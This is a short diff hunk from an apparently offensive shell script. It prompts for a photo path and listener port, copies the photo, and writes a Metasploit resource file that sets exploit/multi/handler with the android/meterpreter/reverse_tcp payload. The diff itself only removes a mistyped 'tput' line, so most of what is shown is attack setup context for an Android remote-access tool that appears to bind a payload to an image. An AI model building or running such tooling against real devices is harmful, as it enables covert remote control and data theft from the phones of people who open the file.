@@ -38,7 +38,6 @@ tput setaf 5; echo " "
 read -p 'SET  PHOTO PATH❯❯ ' photo
 tput setaf 6; echo " "
 read -p 'SET LISTNER LPORT❯❯ ' port
-tupt setaf 2; echo " "
 cp "$photo" image.jpeg
 echo "use exploit/multi/handler" > .d.rc
 echo "set payload android/meterpreter/reverse_tcp" >> .d.rc
